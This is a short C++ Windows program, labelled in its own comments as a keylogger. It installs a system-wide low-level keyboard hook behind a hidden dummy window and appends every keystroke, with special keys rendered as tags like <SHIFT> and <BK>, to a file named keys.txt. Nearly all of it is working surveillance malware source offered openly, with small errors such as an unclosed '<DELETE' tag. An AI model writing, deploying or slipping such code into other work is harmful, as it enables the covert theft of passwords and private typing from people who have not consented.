#define _WIN32_WININT 0x0500

#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

#include <fstream>
#include <windows.h>
#include "frmDummyWindow.h"

using namespace std;

/* Declare Keylogger Hook */
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);


int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nCmdShow)
{
     // Sets windows hook
    HHOOK keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        keyboardHookProc,
        hThisInstance,
        0
    );

    return startWin32DummyWindow(hThisInstance);
}

/* Keylogger Hook */
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);

    ofstream out("keys.txt", std::ios_base::app);
    // If key is being pressed
    if (wParam == WM_KEYDOWN) {
        switch (p->vkCode) {
            // Invisible keys
            case VK_CAPITAL:    out << "<CAPSLOCK>";     break;
            case VK_SHIFT:      out << "<SHIFT>";        break;
            case VK_LCONTROL:   out << "<LCTRL>";        break;
            case VK_RCONTROL:   out << "<RCTRL>";        break;
            case VK_INSERT:     out << "<INSERT>";       break;
            case VK_END:        out << "<END>";          break;
            case VK_PRINT:      out << "<PRINT>";        break;
            case VK_DELETE:     out << "<DELETE";        break;
            case VK_BACK:       out << "<BK>";           break;

            case VK_LEFT:       out << "<LEFT>";         break;
            case VK_RIGHT:      out << "<RIGHT>";        break;
            case VK_UP:         out << "<UP>";           break;
            case VK_DOWN:       out << "<DOWN>";         break;

            // Visible keys
            default:            out << char(tolower(p->vkCode));
        }
    }
    out.close();

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
